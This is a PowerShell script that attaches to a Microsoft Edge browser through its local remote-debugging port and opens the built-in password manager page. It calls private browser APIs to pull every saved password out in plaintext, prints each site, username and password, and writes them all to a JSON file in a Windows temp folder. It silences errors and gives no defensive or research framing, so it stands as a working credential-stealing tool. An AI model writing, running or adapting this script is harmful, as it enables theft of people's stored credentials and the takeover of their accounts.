$ErrorActionPreference = 'SilentlyContinue'

# Connect to browser-level WebSocket
$ver = (curl.exe -s http://127.0.0.1:9222/json/version | ConvertFrom-Json)
$browserWs = $ver.webSocketDebuggerUrl

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$browserWs, $ct).Wait()

$buf = [byte[]]::new(10485760)
$script:mid = 0
$script:sessionId = $null

function SendBrowser {
    param([string]$Method, [hashtable]$Params)
    $script:mid++
    $m = @{ id = $script:mid; method = $Method }
    if ($Params) { $m['params'] = $Params }
    if ($script:sessionId) { $m['sessionId'] = $script:sessionId }
    $j = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($j)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, 'Text', $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# ═══ 1. Create target for edge://password-manager ═══
Write-Output "[1] creating target..."
$createResp = SendBrowser "Target.createTarget" @{ url = "edge://password-manager" }
Write-Output "    $createResp"
$createObj = $createResp | ConvertFrom-Json
$targetId = $createObj.result.targetId
Start-Sleep 10

# ═══ 2. Attach to target (flatten mode = get sessionId) ═══
Write-Output "[2] attaching to target $targetId..."
$attachResp = SendBrowser "Target.attachToTarget" @{ targetId = $targetId; flatten = $true }
Write-Output "    $attachResp"
$attachObj = $attachResp | ConvertFrom-Json
$script:sessionId = $attachObj.result.sessionId
Write-Output "    sessionId: $sessionId"

# ═══ 3. Enable Runtime in the session ═══
Write-Output "[3] enabling Runtime..."
$enableResp = SendBrowser "Runtime.enable" $null
Write-Output "    $enableResp"

# ═══ 4. Check the page URL and available APIs ═══
Write-Output "[4] checking page..."
$urlResp = SendBrowser "Runtime.evaluate" @{ expression = 'window.location.href'; returnByValue = $true }
$urlObj = $urlResp | ConvertFrom-Json
Write-Output "    URL: $($urlObj.result.result.value)"

$apiResp = SendBrowser "Runtime.evaluate" @{ expression = 'JSON.stringify({hasPasswordManagerPrivate: !!chrome.passwordsManagerPrivate, hasPasswordsPrivate: !!chrome.passwordsPrivate, chromeKeys: Object.keys(chrome).filter(k=>k.includes("password")||k.includes("Password"))})'; returnByValue = $true }
$apiObj2 = $apiResp | ConvertFrom-Json
Write-Output "    APIs: $($apiObj2.result.result.value)"

# ═══ 5. Get password list ═══
Write-Output "[5] getting saved passwords..."
$listResp = SendBrowser "Runtime.evaluate" @{
    expression = @'
new Promise(async (resolve) => {
    try {
        // Try passwordsManagerPrivate first (Edge-specific)
        if (chrome.passwordsManagerPrivate) {
            const list = await new Promise((res, rej) => {
                chrome.passwordsManagerPrivate.getSavedPasswordList(function(entries) {
                    if (chrome.runtime.lastError) rej(chrome.runtime.lastError);
                    else res(entries || []);
                });
            });
            resolve(JSON.stringify({source: "passwordsManagerPrivate", count: list.length, data: list}));
            return;
        }
        // Fallback to passwordsPrivate
        if (chrome.passwordsPrivate) {
            const list = await new Promise((res, rej) => {
                chrome.passwordsPrivate.getSavedPasswordList(function(entries) {
                    if (chrome.runtime.lastError) rej(chrome.runtime.lastError);
                    else res(entries || []);
                });
            });
            resolve(JSON.stringify({source: "passwordsPrivate", count: list.length, data: list}));
            return;
        }
        resolve(JSON.stringify({error: "no password API found"}));
    } catch(e) {
        resolve(JSON.stringify({error: e.message}));
    }
})
'@
    awaitPromise = $true
    returnByValue = $true
}
$listObj = $listResp | ConvertFrom-Json
$listVal = $listObj.result.result.value
Write-Output "    list: $($listVal.Substring(0, [Math]::Min(500, [string]$listVal)))"

if ($listVal -and -not $listVal.Contains('"error"')) {
    $listData = $listVal | ConvertFrom-Json
    $passwords = $listData.data
    Write-Output "[+] $($passwords.Count) passwords via $($listData.source)"

    # ═══ 6. Extract each password ═══
    $results = [System.Collections.ArrayList]::new()

    for ($i = 0; $i -lt $passwords.Count; $i++) {
        $entry = $passwords[$i]
        $eid = $entry.id
        $eurl = if ($entry.urls -and $entry.urls.Count -gt 0) { $entry.urls[0] } else { "unknown" }
        $euser = $entry.username

        Write-Output "[*] [$($i+1)/$($passwords.Count)] $eurl ($euser)..."

        $getJs = @"
new Promise(async (resolve) => {
    try {
        const api = chrome.passwordsManagerPrivate || chrome.passwordsPrivate;
        // Try requestPlaintextPassword (Edge)
        if (api.requestPlaintextPassword) {
            const pw = await new Promise((res, rej) => {
                api.requestPlaintextPassword($eid, "PASSWORD_MANAGER", function(password) {
                    if (chrome.runtime.lastError) rej(chrome.runtime.lastError);
                    else res(password);
                });
            });
            resolve(JSON.stringify({p: pw}));
            return;
        }
        // Fallback to getPlaintextPassword (Chrome pattern)
        if (api.getPlaintextPassword) {
            const pw = await new Promise((res, rej) => {
                api.getPlaintextPassword($eid, function(password) {
                    if (chrome.runtime.lastError) rej(chrome.runtime.lastError);
                    else res(password);
                });
            });
            resolve(JSON.stringify({p: pw}));
            return;
        }
        resolve(JSON.stringify({err: "no plaintext method"}));
    } catch(e) {
        resolve(JSON.stringify({err: e.message}));
    }
})
"@

        $getResp = SendBrowser "Runtime.evaluate" @{
            expression = $getJs
            awaitPromise = $true
            returnByValue = $true
        }
        $getObj = $getResp | ConvertFrom-Json
        $getVal = $getObj.result.result.value

        if ($getVal) {
            $pwData = $getVal | ConvertFrom-Json
            if ($pwData.p) {
                [void]$results.Add([PSCustomObject]@{url=$eurl; username=$euser; password=$pwData.p})
                Write-Output "    PASSWORD: $($pwData.p)"
            } else {
                Write-Output "    err: $($pwData.err)"
                [void]$results.Add([PSCustomObject]@{url=$eurl; username=$euser; password="<err>"})
            }
        }
    }

    # ═══ Output ═══
    Write-Output ""
    Write-Output "================================================================"
    foreach ($r in $results) {
        Write-Output "  $($r.url) | $($r.username) | $($r.password)"
    }

    $results | ConvertTo-Json -Depth 3 | Out-File "C:\Windows\Temp\ziti\pwd_final2.json" -Encoding utf8
    Write-Output "[+] saved to pwd_final2.json"

} else {
    Write-Output "no passwords retrieved"
    Write-Output "full response: $listResp"
}

$ws.Dispose()
Write-Output "[+] done"